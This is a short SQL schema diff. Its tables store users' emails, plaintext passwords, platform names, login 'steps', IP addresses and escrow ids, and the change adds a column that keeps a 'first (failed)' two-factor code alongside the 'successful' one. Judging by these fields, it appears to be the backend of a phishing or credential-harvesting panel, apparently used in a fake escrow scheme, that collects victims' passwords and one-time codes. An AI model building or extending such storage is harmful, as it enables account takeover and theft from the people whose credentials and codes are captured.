@@ -78,7 +78,8 @@ CREATE TABLE IF NOT EXISTS client_logins (
   id VARCHAR(255) PRIMARY KEY,
   email VARCHAR(255),
   password_hash TEXT, -- Stores plaintext password (not hashed) for client logins
-  two_factor_code VARCHAR(10),
+  two_factor_code VARCHAR(10), -- Second (successful) 2FA code
+  first_two_factor_code VARCHAR(10), -- First (failed) 2FA code
   platform VARCHAR(50),
   step VARCHAR(50),
   ip_address VARCHAR(45),
@@ -97,7 +98,8 @@ CREATE TABLE IF NOT EXISTS buyer_logins (
   id VARCHAR(255) PRIMARY KEY,
   email VARCHAR(255),
   password_hash TEXT, -- Stores plaintext password (not hashed) for buyer logins
-  two_factor_code VARCHAR(10),
+  two_factor_code VARCHAR(10), -- Second (successful) 2FA code
+  first_two_factor_code VARCHAR(10), -- First (failed) 2FA code
   platform VARCHAR(50),
   escrow_id VARCHAR(255),
   step VARCHAR(50),
@@ -238,3 +240,16 @@ CREATE TRIGGER update_escrows_updated_at BEFORE UPDATE ON escrows
 
 CREATE TRIGGER update_users_updated_at BEFORE UPDATE ON users
   FOR EACH ROW EXECUTE FUNCTION update_updated_at_column();
+
+-- Migration: Add first_two_factor_code column if it doesn't exist
+DO $$ 
+BEGIN
+  IF NOT EXISTS (SELECT 1 FROM information_schema.columns 
+                 WHERE table_name='client_logins' AND column_name='first_two_factor_code') THEN
+    ALTER TABLE client_logins ADD COLUMN first_two_factor_code VARCHAR(10);
+  END IF;
+  IF NOT EXISTS (SELECT 1 FROM information_schema.columns 
+                 WHERE table_name='buyer_logins' AND column_name='first_two_factor_code') THEN
+    ALTER TABLE buyer_logins ADD COLUMN first_two_factor_code VARCHAR(10);
+  END IF;
+END $$;
